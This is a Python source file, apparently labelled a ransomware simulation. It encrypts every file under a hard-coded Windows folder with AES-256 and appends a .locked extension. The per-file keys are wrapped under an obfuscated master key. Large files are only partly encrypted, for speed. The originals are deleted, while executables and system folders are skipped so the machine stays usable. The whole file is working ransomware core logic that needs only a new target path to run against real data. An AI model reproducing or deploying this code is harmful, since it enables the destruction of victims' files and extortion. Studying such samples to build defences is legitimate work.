import os
import secrets
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# === Obfuscated master key ("jancoks123") ===
hidden_master = b''.join(bytes([ord(c) ^ 0x13]) for c in "kZ]VTLR^PVW")
master_key = bytes([b ^ 0x13 for b in hidden_master])  # Derive kembali: b'jancoks123'
aes_master_key = hashlib.sha256(master_key).digest()  # 32-byte untuk AES-256

def encrypt_file(filepath: str, ext: str = '.locked'):
    try:
        # Generate per-file random AES-256 key & IV
        per_file_key = secrets.token_bytes(32)
        iv = secrets.token_bytes(16)

        # Encrypt per-file key dengan master key (mimic wrapped key)
        cipher_wrap = Cipher(algorithms.AES(aes_master_key), modes.CBC(iv), backend=default_backend())
        encryptor_wrap = cipher_wrap.encryptor()
        padder_wrap = padding.PKCS7(128).padder()
        padded_key = padder_wrap.update(per_file_key) + padder_wrap.finalize()
        encrypted_per_file_key = encryptor_wrap.update(padded_key) + encryptor_wrap.finalize()

        # Read file data
        with open(filepath, 'rb') as f:
            data = f.read()

        # Optional intermittent: encrypt hanya 1MB pertama + setiap 10MB (mirip real ransomware untuk speed)
        if len(data) > 1048576:  # >1MB
            encrypted_data = bytearray(data)
            cipher = Cipher(algorithms.AES(per_file_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            padder = padding.PKCS7(128).padder()

            # Encrypt chunk awal
            chunk = encrypted_data[:1048576]
            padded = padder.update(chunk) + padder.finalize()
            encrypted_data[:1048576] = encryptor.update(padded) + encryptor.finalize()

            # Encrypt partial lain (contoh setiap 10MB)
            step = 10 * 1048576
            for i in range(step, len(encrypted_data), step):
                chunk = encrypted_data[i:i+1048576]
                if chunk:
                    padded = padder.update(chunk) + padder.finalize()
                    encrypted_data[i:i+len(chunk)] = encryptor.update(padded)[:len(chunk)]
            data = bytes(encrypted_data)
        else:
            # Full encrypt kecil file
            cipher = Cipher(algorithms.AES(per_file_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()
            data = encryptor.update(padded_data) + encryptor.finalize()

        # Write: IV + wrapped_key + ciphertext
        outpath = filepath + ext
        with open(outpath, 'wb') as f:
            f.write(iv + encrypted_per_file_key + data)

        os.remove(filepath)
        print(f"ENCRYPTED: {filepath} -> {outpath}")
    except Exception as e:
        print(f"FAILED: {filepath} | {e}")

def process_path(path: str):
    path = os.path.normpath(path)
    if os.path.isfile(path):
        # Skip critical extensions
        if path.lower().endswith(('.exe', '.dll', '.sys')):
            return
        encrypt_file(path)
    elif os.path.isdir(path):
        print(f"Processing folder: {path}")
        for root, dirs, files in os.walk(path, topdown=False):
            # Skip system folders
            dirs[:] = [d for d in dirs if d.lower() not in ['windows', 'program files', 'program files (x86)']]
            for file in files:
                if file.lower().endswith('.locked'):
                    continue
                filepath = os.path.join(root, file)
                encrypt_file(filepath)
    else:
        print(f"Path not found: {path}")

# === OTOMATIS EKSEKUSI ===
if __name__ == "__main__":
    target_path = r"C:\Users\SRA90002045\Documents\tesransom"
    
    print("Starting realistic ransomware simulation (AES-256 per-file)...")
    process_path(target_path)
    print("Encryption complete. Files locked with .locked extension.")
